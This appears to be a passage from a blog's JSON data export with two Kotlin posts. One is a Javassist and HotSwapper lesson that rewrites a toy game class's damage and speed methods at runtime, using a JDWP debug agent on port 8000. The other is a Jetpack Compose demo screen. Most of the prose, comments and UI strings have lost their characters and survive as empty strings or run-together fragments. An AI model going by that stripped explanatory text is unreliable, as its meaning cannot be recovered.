function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 400;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Entity\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// jvm -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 implementation tools.jar</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 999999L;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 400;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> swap <span class=\"token operator\">=</span> <span class=\"token function\">HotSwapper</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n    swap<span class=\"token punctuation\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">,</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toBytecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p>HotSwapperJavassisttools.jar</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Javassist-amp-Javagent\"><a href=\"#Javassist-amp-Javagent\" class=\"headerlink\" title=\"Javassist &amp; Javagent\"></a>Javassist &amp; Javagent</h1><blockquote>\n<p>level</p>\n<p>HeroBossBossHeroHeroBoss</p>\n<p>HeroBoss</p>\n<p>ASMJavassist</p>\n<p>Javassist</p>\n<p></p>\n</blockquote>\n<h2 id=\"Javassist\"><a href=\"#Javassist\" class=\"headerlink\" title=\"Javassist\"></a>Javassist</h2><p></p>\n<blockquote>\n<p>JavaSystemClassLoaderClassLoaderClassLoadergcVM Options</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>optionsJavassistHotswapperVM</p>\n<p>Options</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * \n *  javassist \n *\n * @author \n * @since 2021/11/18 10:58\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> hero<span class=\"token operator\">:</span> Entity <span class=\"token operator\">=</span> <span class=\"token function\">Hero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> boss <span class=\"token operator\">=</span> <span class=\"token function\">Boss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//    bypass(hero)</span>\n<span class=\"token comment\">//    hero = javassistByPass(hero)</span>\n    <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>boss<span class=\"token punctuation\">.</span>speed <span class=\"token operator\">></span> hero<span class=\"token punctuation\">.</span>speed<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Boss  </span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Boss\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// hero </span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hero<span class=\"token punctuation\">.</span>damage <span class=\"token operator\">>=</span> boss<span class=\"token punctuation\">.</span>health<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Boss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BossBoss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * ()\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">bypass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"damage\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"speed\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// javassist</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistByPass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Entity <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctClass<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.HeroEdited\"</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 999999L;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 400;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Entity\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// jvm -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 implementation tools.jar</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 999999L;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 400;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> swap <span class=\"token operator\">=</span> <span class=\"token function\">HotSwapper</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n    swap<span class=\"token punctuation\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">,</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toBytecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p>HotSwapperJavassisttools.jar</p>\n</blockquote>\n"},{"title":"Jetpack Compose","date":"2021-12-23T16:00:00.000Z","author":"","hide":false,"summary":"Jetpack ComposeGithub App","_content":"\n# Jetpack Compose\n\nWanAndroid***Jetpack Compose***Github App\n\nDSLUIMinecraftUIAndroidxmlUIAndroiduiUIJetpack ComposeDSLJetpack UI\n\nWanAndroidAndroid StudioComposeComposedemo\n\n## \n\n~~~kotlin\nclass MainActivity : ComponentActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContent {\n            ComposeTestTheme() {\n                Main()\n            }\n        }\n    }\n\n    @Composable\n    fun Main(\n        avatar: String = \"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\",\n    ) {\n        var selectedItem by remember { mutableStateOf(0) }\n        val items = listOf(\"\", \"\", \"\")\n        Scaffold(\n            bottomBar = {\n                BottomNavigation(\n                    backgroundColor = Color.White,\n                    modifier = Modifier.height(50.dp)\n                ) {\n                    items.forEachIndexed { index, item ->\n                        BottomNavigationItem(\n                            icon = {\n                                when(index){\n                                    0 -> Icon(Icons.Filled.Home, contentDescription = null)\n                                    1 -> Icon(Icons.Filled.Notifications, contentDescription = null)\n                                    else -> Icon(Icons.Filled.Search, contentDescription = null)\n                                }\n                            },\n                            label = { Text(item) },\n                            selected = selectedItem == index,\n                            onClick = { selectedItem = index },\n                        )\n                    }\n                }\n            }\n        ) {\n            Column(\n                Modifier.padding(10.dp)\n            ) {\n                Row(\n                    verticalAlignment = Alignment.CenterVertically\n                ) {\n                    Surface(\n                        shape = CircleShape,\n                    ) {\n                        Image(\n                            painter = rememberImagePainter(data = avatar),\n                            contentDescription = null,\n                            modifier = Modifier.size(40.dp),\n                            contentScale = ContentScale.Crop\n                        )\n                    }\n                    Text(\n                        text = \"\",\n                        style = TextStyle(\n                            fontWeight = FontWeight.Bold,\n                            fontSize = 20.sp\n                        ),\n                        modifier = Modifier.padding(15.dp)\n                    )\n                }\n                Text(\n                    text = \"\",\n                    style = TextStyle(\n                        fontWeight = FontWeight.Bold,\n                        fontSize = 16.sp\n                    ),\n                    modifier = Modifier.padding(top = 30.dp, bottom = 20.dp)\n                )\n                WorkSelection(icon = R.drawable.ic_issue_opened, text = \"\", Color(0xFF25CA25))\n                WorkSelection(icon = R.drawable.ic_pull_request, text = \"\", Color(0xFF11ABF1))\n                WorkSelection(icon = R.drawable.ic_git_repository_line, text = \"\", Color(0xFF8811F1))\n                WorkSelection(icon = R.drawable.ic_organization, text = \"\", Color(0xFFF18C11))\n                Divider(\n                    color = Color.Gray,\n                    modifier = Modifier.padding(top = 10.dp)\n                )\n                    Column(\n                        Modifier.padding(vertical = 10.dp)\n                    ) {\n                        Text(\n                            text = \"\",\n                            style = TextStyle(\n                                fontWeight = FontWeight.Bold,\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(bottom = 10.dp)\n                        )\n                        Text(\n                            text = \"\",\n                            style = TextStyle(\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(top = 10.dp)\n                        )\n                        Column(\n                            modifier = Modifier\n                                .fillMaxWidth()\n                                .padding(top = 10.dp),\n                            horizontalAlignment = Alignment.CenterHorizontally\n                        ) {\n                            Card(\n                                modifier = Modifier.padding(horizontal = 20.dp),\n                                shape = RoundedCornerShape(20)\n                            ) {\n                                Button(\n                                    onClick = { /*TODO*/ },\n                                    elevation = null,\n                                    modifier = Modifier.fillMaxWidth(),\n                                    shape = RoundedCornerShape(20),\n                                    colors = ButtonDefaults.buttonColors(\n                                        backgroundColor = Color.Transparent\n                                    )\n                                ) {\n                                    Text(\n                                        text = \"\",\n                                        style = TextStyle(\n                                            fontSize = 14.sp,\n                                            color = Color(0xFF229DD5)\n                                        ),\n                                        modifier = Modifier.padding(10.dp)\n                                    )\n                                }\n                            }\n                        }\n                    }\n            }\n        }\n    }\n\n    @Composable\n    fun WorkSelection(\n        icon: Int,\n        text: String,\n        color: Color\n    ) {\n        Row(\n            Modifier.padding(vertical = 10.dp),\n            verticalAlignment = Alignment.CenterVertically\n        ) {\n            // icon\n            Surface(\n                shape = RoundedCornerShape(10),\n                modifier = Modifier.padding(end = 20.dp)\n            ) {\n                Image(\n                    painter = painterResource(id = icon),\n                    contentDescription = null,\n                    modifier = Modifier\n                        .size(30.dp)\n                        .background(color),\n                    colorFilter = ColorFilter.tint(Color.White)\n                )\n            }\n            Text(\n                text = text,\n                style = TextStyle(\n                    fontSize = 15.sp\n                )\n            )\n        }\n    }\n\n    @Preview\n    @Composable\n    fun Preview() {\n        Main()\n    }\n}\n~~~\n\n## \n\nCompose\n\n![](https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg)","source":"_posts/jetpack-compose-test.md","raw":"---\ntitle: Jetpack Compose\ndate: 2021-12-24\nauthor: \nhide: false\nsummary: Jetpack ComposeGithub App\ncategories: \ntags:\n  - Kotlin\n  - Compose\n  - Android\n---\n\n# Jetpack Compose\n\nWanAndroid***Jetpack Compose***Github App\n\nDSLUIMinecraftUIAndroidxmlUIAndroiduiUIJetpack ComposeDSLJetpack UI\n\nWanAndroidAndroid StudioComposeComposedemo\n\n## \n\n~~~kotlin\nclass MainActivity : ComponentActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContent {\n            ComposeTestTheme() {\n                Main()\n            }\n        }\n    }\n\n    @Composable\n    fun Main(\n        avatar: String = \"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\",\n    ) {\n        var selectedItem by remember { mutableStateOf(0) }\n        val items = listOf(\"\", \"\", \"\")\n        Scaffold(\n            bottomBar = {\n                BottomNavigation(\n                    backgroundColor = Color.White,\n                    modifier = Modifier.height(50.dp)\n                ) {\n                    items.forEachIndexed { index, item ->\n                        BottomNavigationItem(\n                            icon = {\n                                when(index){\n                                    0 -> Icon(Icons.Filled.Home, contentDescription = null)\n                                    1 -> Icon(Icons.Filled.Notifications, contentDescription = null)\n                                    else -> Icon(Icons.Filled.Search, contentDescription = null)\n                                }\n                            },\n                            label = { Text(item) },\n                            selected = selectedItem == index,\n                            onClick = { selectedItem = index },\n                        )\n                    }\n                }\n            }\n        ) {\n            Column(\n                Modifier.padding(10.dp)\n            ) {\n                Row(\n                    verticalAlignment = Alignment.CenterVertically\n                ) {\n                    Surface(\n                        shape = CircleShape,\n                    ) {\n                        Image(\n                            painter = rememberImagePainter(data = avatar),\n                            contentDescription = null,\n                            modifier = Modifier.size(40.dp),\n                            contentScale = ContentScale.Crop\n                        )\n                    }\n                    Text(\n                        text = \"\",\n                        style = TextStyle(\n                            fontWeight = FontWeight.Bold,\n                            fontSize = 20.sp\n                        ),\n                        modifier = Modifier.padding(15.dp)\n                    )\n                }\n                Text(\n                    text = \"\",\n                    style = TextStyle(\n                        fontWeight = FontWeight.Bold,\n                        fontSize = 16.sp\n                    ),\n                    modifier = Modifier.padding(top = 30.dp, bottom = 20.dp)\n                )\n                WorkSelection(icon = R.drawable.ic_issue_opened, text = \"\", Color(0xFF25CA25))\n                WorkSelection(icon = R.drawable.ic_pull_request, text = \"\", Color(0xFF11ABF1))\n                WorkSelection(icon = R.drawable.ic_git_repository_line, text = \"\", Color(0xFF8811F1))\n                WorkSelection(icon = R.drawable.ic_organization, text = \"\", Color(0xFFF18C11))\n                Divider(\n                    color = Color.Gray,\n                    modifier = Modifier.padding(top = 10.dp)\n                )\n                    Column(\n                        Modifier.padding(vertical = 10.dp)\n                    ) {\n                        Text(\n                            text = \"\",\n                            style = TextStyle(\n                                fontWeight = FontWeight.Bold,\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(bottom = 10.dp)\n                        )\n                        Text(\n                            text = \"\",\n                            style = TextStyle(\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(top = 10.dp)\n                        )\n                        Column(\n                            modifier = Modifier\n                                .fillMaxWidth()\n                                .padding(top = 10.dp),\n                            horizontalAlignment = Alignment.CenterHorizontally\n                        ) {\n                            Card(\n                                modifier = Modifier.padding(horizontal = 20.dp),\n                                shape = RoundedCornerShape(20)\n                            ) {\n                                Button(\n                                    onClick = { /*TODO*/ },\n                                    elevation = null,\n                                    modifier = Modifier.fillMaxWidth(),\n                                    shape = RoundedCornerShape(20),\n                                    colors = ButtonDefaults.buttonColors(\n                                        backgroundColor = Color.Transparent\n                                    )\n                                ) {\n                                    Text(\n                                        text = \"\",\n                                        style = TextStyle(\n                                            fontSize = 14.sp,\n                                            color = Color(0xFF229DD5)\n                                        ),\n                                        modifier = Modifier.padding(10.dp)\n                                    )\n                                }\n                            }\n                        }\n                    }\n            }\n        }\n    }\n\n    @Composable\n    fun WorkSelection(\n        icon: Int,\n        text: String,\n        color: Color\n    ) {\n        Row(\n            Modifier.padding(vertical = 10.dp),\n            verticalAlignment = Alignment.CenterVertically\n        ) {\n            // icon\n            Surface(\n                shape = RoundedCornerShape(10),\n                modifier = Modifier.padding(end = 20.dp)\n            ) {\n                Image(\n                    painter = painterResource(id = icon),\n                    contentDescription = null,\n                    modifier = Modifier\n                        .size(30.dp)\n                        .background(color),\n                    colorFilter = ColorFilter.tint(Color.White)\n                )\n            }\n            Text(\n                text = text,\n                style = TextStyle(\n                    fontSize = 15.sp\n                )\n            )\n        }\n    }\n\n    @Preview\n    @Composable\n    fun Preview() {\n        Main()\n    }\n}\n~~~\n\n## \n\nCompose\n\n![](https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg)","slug":"jetpack-compose-test","published":1,"updated":"2022-12-12T15:54:35.874Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtm001osfklftyf0ncv","content":"<h1 id=\"Jetpack-Compose\"><a href=\"#Jetpack-Compose\" class=\"headerlink\" title=\"Jetpack Compose\"></a>Jetpack Compose</h1><p>WanAndroid<em><strong>Jetpack Compose</strong></em>Github App</p>\n<p>DSLUIMinecraftUIAndroidxmlUIAndroiduiUIJetpack ComposeDSLJetpack UI</p>\n<p>WanAndroidAndroid StudioComposeComposedemo</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> MainActivity <span class=\"token operator\">:</span> <span class=\"token function\">ComponentActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token operator\">:</span> Bundle<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token punctuation\">)</span>\n        setContent <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">ComposeTestTheme</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span>\n        avatar<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> selectedItem <span class=\"token keyword\">by</span> remember <span class=\"token punctuation\">{</span> <span class=\"token function\">mutableStateOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">val</span> items <span class=\"token operator\">=</span> <span class=\"token function\">listOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">Scaffold</span><span class=\"token punctuation\">(</span>\n            bottomBar <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">BottomNavigation</span><span class=\"token punctuation\">(</span>\n                    backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">height</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    items<span class=\"token punctuation\">.</span><span class=\"token function\">forEachIndexed</span> <span class=\"token punctuation\">{</span> index<span class=\"token punctuation\">,</span> item <span class=\"token operator\">-&gt;</span>\n                        <span class=\"token function\">BottomNavigationItem</span><span class=\"token punctuation\">(</span>\n                            icon <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token keyword\">when</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                                    <span class=\"token number\">0</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Home<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token number\">1</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Notifications<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token keyword\">else</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Search<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">}</span>\n                            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                            label <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                            selected <span class=\"token operator\">=</span> selectedItem <span class=\"token operator\">==</span> index<span class=\"token punctuation\">,</span>\n                            onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> selectedItem <span class=\"token operator\">=</span> index <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token 